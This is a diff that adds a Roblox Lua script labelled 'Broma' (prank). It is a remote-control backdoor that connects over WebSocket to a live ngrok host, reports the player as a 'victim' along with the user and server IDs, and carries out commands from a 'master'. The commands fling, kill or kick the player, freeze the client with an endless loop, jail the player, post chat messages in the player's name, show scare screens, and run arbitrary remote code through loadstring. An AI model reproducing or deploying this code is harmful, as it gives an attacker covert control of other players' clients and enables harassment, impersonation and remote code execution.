@@ -1,0 +1,408 @@
+-- -Broma
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+local WS_URL = "wss://upstairs-whenever-unveiled.ngrok-free.dev"
+
+local WS_Connect = (WebSocket and WebSocket.connect)
+    or (websocket and websocket.connect)
+    or (syn and syn.websocket and syn.websocket.connect)
+    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
+    or (getgenv and getgenv().websocket and getgenv().websocket.connect)
+if not WS_Connect then return end
+
+local mySessionId = tostring(tick()) .. "_" .. tostring(math.random(1000, 9999))
+_G.SacredVictimSessionId = mySessionId
+
+if _G.SacredVictimWS then
+    pcall(function() _G.SacredVictimWS:Close() end)
+    _G.SacredVictimWS = nil
+end
+
+local currentJail = nil
+local speedLoop = nil
+local spinLoop = nil
+local isSpinning = false
+local controlsInverted = false
+
+local function getGui()
+    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChild("PlayerGui")
+    if pg then return pg end
+    if gethui then
+        local ok, h = pcall(gethui)
+        if ok and h then return h end
+    end
+    return game:GetService("CoreGui")
+end
+
+local function getCharacter()
+    local c = LocalPlayer.Character
+    if c and c:FindFirstChild("HumanoidRootPart") then
+        return c, c:FindFirstChild("HumanoidRootPart"), c:FindFirstChildOfClass("Humanoid")
+    end
+    local wc = workspace:FindFirstChild(LocalPlayer.Name)
+    if wc and wc:FindFirstChild("HumanoidRootPart") then
+        return wc, wc:FindFirstChild("HumanoidRootPart"), wc:FindFirstChildOfClass("Humanoid")
+    end
+    if c then
+        local r = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
+        local h = c:FindFirstChildOfClass("Humanoid")
+        return c, r, h
+    end
+    return nil, nil, nil
+end
+
+local function handleCommand(data, ws)
+    if data.target and data.target ~= "TODOS" then
+        local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
+        local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
+        local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
+        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
+            return
+        end
+    end
+
+    pcall(function()
+        ws:Send(HttpService:JSONEncode({
+            type = "cmd_ack",
+            action = tostring(data.action),
+            username = tostring(LocalPlayer.Name),
+            status = "ejecutado"
+        }))
+    end)
+
+    local char, root, hum = getCharacter()
+    local cam = workspace.CurrentCamera
+
+    if data.action == "fling" and root then
+        pcall(function()
+            if hum then hum.Sit = true hum.PlatformStand = true end
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "SacredFling"
+            bv.Velocity = Vector3.new(math.random(-500, 500), 8000, math.random(-500, 500))
+            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+            bv.Parent = root
+            Debris:AddItem(bv, 1.5)
+            root.AssemblyLinearVelocity = Vector3.new(0, 8000, 0)
+            root.RotVelocity = Vector3.new(10000, 10000, 10000)
+        end)
+
+    elseif data.action == "explosion" and root then
+        pcall(function()
+            local exp = Instance.new("Explosion")
+            exp.Position = root.Position
+            exp.BlastPressure = 5000000
+            exp.BlastRadius = 30
+            exp.Parent = workspace
+            if hum then hum.Sit = true hum.PlatformStand = true end
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "SacredExplode"
+            bv.Velocity = Vector3.new(math.random(-1500, 1500), 5000, math.random(-1500, 1500))
+            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+            bv.Parent = root
+            Debris:AddItem(bv, 1)
+            root.RotVelocity = Vector3.new(6000, 6000, 6000)
+        end)
+
+    elseif data.action == "kick" then
+        pcall(function()
+            LocalPlayer:Kick("Has sido expulsado del servidor por un Administrador. (Error Code: 267)")
+        end)
+        task.delay(0.6, function()
+            pcall(function()
+                while true do
+                    Instance.new("Message", workspace).Text = "KICKED"
+                end
+            end)
+        end)
+
+    elseif data.action == "reset_character" then
+        pcall(function()
+            if char then char:BreakJoints() end
+            if hum then hum.Health = 0 hum:ChangeState(Enum.HumanoidStateType.Dead) end
+            if root then root.CFrame = CFrame.new(0, -99999, 0) end
+        end)
+
+    elseif data.action == "freeze" and root then
+        pcall(function() root.Anchored = true end)
+
+    elseif data.action == "unfreeze" and root then
+        pcall(function() root.Anchored = false end)
+
+    elseif data.action == "super_speed" and hum then
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
+        hum.WalkSpeed = 250
+        speedLoop = RunService.RenderStepped:Connect(function()
+            local _, _, h = getCharacter()
+            if h then h.WalkSpeed = 250 end
+        end)
+
+    elseif data.action == "snail_speed" and hum then
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
+        hum.WalkSpeed = 3
+        speedLoop = RunService.RenderStepped:Connect(function()
+            local _, _, h = getCharacter()
+            if h then h.WalkSpeed = 3 end
+        end)
+
+    elseif data.action == "normal_speed" and hum then
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
+        hum.WalkSpeed = 16
+
+    elseif data.action == "spin" and root then
+        isSpinning = true
+        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end
+        spinLoop = RunService.RenderStepped:Connect(function()
+            if not isSpinning then return end
+            local _, r, _ = getCharacter()
+            if r then
+                r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(25), 0)
+            end
+        end)
+
+    elseif data.action == "unspin" then
+        isSpinning = false
+        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end
+
+    elseif data.action == "jail" and root then
+        if currentJail then pcall(function() currentJail:Destroy() end) end
+        local jModel = Instance.new("Model")
+        jModel.Name = "SacredCage"
+        jModel.Parent = workspace
+        local center = root.Position
+        local walls = {
+            {Vector3.new(0, -3.5, 0), Vector3.new(8, 1, 8)},
+            {Vector3.new(0, 5, 0), Vector3.new(8, 1, 8)},
+            {Vector3.new(4, 1, 0), Vector3.new(1, 8, 8)},
+            {Vector3.new(-4, 1, 0), Vector3.new(1, 8, 8)},
+            {Vector3.new(0, 1, 4), Vector3.new(8, 8, 1)},
+            {Vector3.new(0, 1, -4), Vector3.new(8, 8, 1)},
+        }
+        for _, d in ipairs(walls) do
+            local p = Instance.new("Part")
+            p.Size = d[2]
+            p.CFrame = CFrame.new(center + d[1])
+            p.Anchored = true
+            p.Material = Enum.Material.Neon
+            p.Color = Color3.fromRGB(255, 0, 50)
+            p.Transparency = 0.3
+            p.CanCollide = true
+            p.Parent = jModel
+        end
+        currentJail = jModel
+
+    elseif data.action == "unjail" then
+        if currentJail then pcall(function() currentJail:Destroy() end) end
+        currentJail = nil
+
+    elseif data.action == "bring" and root and data.position then
+        pcall(function()
+            root.CFrame = CFrame.new(data.position.x, data.position.y + 3, data.position.z)
+        end)
+
+    elseif data.action == "chat" and data.message then
+        pcall(function()
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:FindFirstChild("RBXSystem")
+                if channel then
+                    channel:SendAsync(tostring(data.message))
+                else
+                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(tostring(data.message))
+                end
+            else
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
+            end
+        end)
+
+    elseif data.action == "blackout" then
+        task.spawn(function()
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.Name = "SacredBlackout"
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999999
+            ui.ResetOnSpawn = false
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            task.wait(6)
+            ui:Destroy()
+        end)
+
+    elseif data.action == "red_scare" then
+        task.spawn(function()
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.Name = "SacredScare"
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999999
+            ui.ResetOnSpawn = false
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+            f.BackgroundTransparency = 0.15
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, 0, 0.4, 0)
+            lbl.Position = UDim2.new(0, 0, 0.3, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+            lbl.TextScaled = true
+            lbl.Font = Enum.Font.GothamBlack
+            lbl.Text = "YA ES TARDE. NO PUEDES ESCAPAR."
+            lbl.Parent = f
+            pcall(function()
+                local s = Instance.new("Sound")
+                s.SoundId = "rbxassetid://9069609267"
+                s.Volume = 3
+                s.Parent = workspace
+                s:Play()
+                task.delay(4, function() pcall(function() s:Destroy() end) end)
+            end)
+            for i = 1, 30 do
+                f.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(220, 0, 0) or Color3.fromRGB(20, 0, 0)
+                lbl.Position = UDim2.new(0, math.random(-15, 15), 0.3, math.random(-15, 15))
+                task.wait(0.08)
+            end
+            ui:Destroy()
+        end)
+
+    elseif data.action == "screen_alert" and data.message then
+        task.spawn(function()
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "\xE2\x9A\xA0\xEF\xB8\x8F AVISO",
+                    Text = tostring(data.message),
+                    Duration = 8
+                })
+            end)
+            local g = getGui()
+            if not g then return end
+            local ui = Instance.new("ScreenGui")
+            ui.Name = "SacredAlert"
+            ui.IgnoreGuiInset = true
+            ui.DisplayOrder = 999998
+            ui.ResetOnSpawn = false
+            ui.Parent = g
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(1, 0, 0, 90)
+            f.Position = UDim2.new(0, 0, 0.1, 0)
+            f.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+            f.BackgroundTransparency = 0.1
+            f.BorderSizePixel = 0
+            f.Parent = ui
+            local txt = Instance.new("TextLabel")
+            txt.Size = UDim2.new(1, -40, 1, 0)
+            txt.Position = UDim2.new(0, 20, 0, 0)
+            txt.BackgroundTransparency = 1
+            txt.TextColor3 = Color3.fromRGB(255, 50, 50)
+            txt.TextScaled = true
+            txt.Font = Enum.Font.GothamBlack
+            txt.Text = "\xE2\x9A\xA0\xEF\xB8\x8F " .. tostring(data.message)
+            txt.Parent = f
+            task.wait(7)
+            ui:Destroy()
+        end)
+
+    elseif data.action == "invert_controls" then
+        controlsInverted = true
+        pcall(function()
+            RunService:UnbindFromRenderStep("SacredInvert")
+            RunService:BindToRenderStep("SacredInvert", Enum.RenderPriority.Character.Value + 1, function()
+                if not controlsInverted then return end
+                local _, _, h = getCharacter()
+                if h and h.MoveDirection.Magnitude > 0.05 then
+                    h:Move(-h.MoveDirection, false)
+                end
+            end)
+        end)
+
+    elseif data.action == "restore_controls" then
+        controlsInverted = false
+        pcall(function() RunService:UnbindFromRenderStep("SacredInvert") end)
+
+    elseif data.action == "earthquake" then
+        if cam then
+            task.spawn(function()
+                local startT = tick()
+                while tick() - startT < 6 do
+                    local ox = (math.random() - 0.5) * 1.5
+                    local oy = (math.random() - 0.5) * 1.5
+                    cam.CFrame = cam.CFrame * CFrame.new(ox, oy, 0)
+                    task.wait(0.03)
+                end
+            end)
+        end
+
+    elseif data.action == "execute" and data.code then
+        task.spawn(function()
+            local fn = loadstring(data.code)
+            if fn then fn() end
+        end)
+    end
+end
+
+task.spawn(function()
+    while _G.SacredVictimSessionId == mySessionId do
+        local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
+        if ok and ws then
+            _G.SacredVictimWS = ws
+
+            local function sendPresence(msgType)
+                pcall(function()
+                    ws:Send(HttpService:JSONEncode({
+                        type = msgType or "victim_joined",
+                        username = LocalPlayer.Name,
+                        userId = LocalPlayer.UserId,
+                        placeId = game.PlaceId,
+                        gameId = game.GameId,
+                        jobId = tostring(game.JobId or "")
+                    }))
+                end)
+            end
+
+            task.wait(0.5)
+            sendPresence("victim_joined")
+
+            local function onMsg(raw)
+                local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
+                if s and data then
+                    if data.type == "ping_victims" then
+                        sendPresence("victim_joined")
+                    elseif data.type == "master_command" then
+                        task.spawn(function()
+                            handleCommand(data, ws)
+                        end)
+                    end
+                end
+            end
+
+            pcall(function() ws.OnMessage:Connect(onMsg) end)
+
+            local isClosed = false
+            pcall(function()
+                ws.OnClose:Connect(function()
+                    isClosed = true
+                end)
+            end)
+
+            while not isClosed and _G.SacredVictimWS == ws and _G.SacredVictimSessionId == mySessionId do
+                task.wait(10)
+                sendPresence("victim_ping")
+            end
+        end
+        if _G.SacredVictimSessionId ~= mySessionId then break end
+        task.wait(3)
+    end
+end)
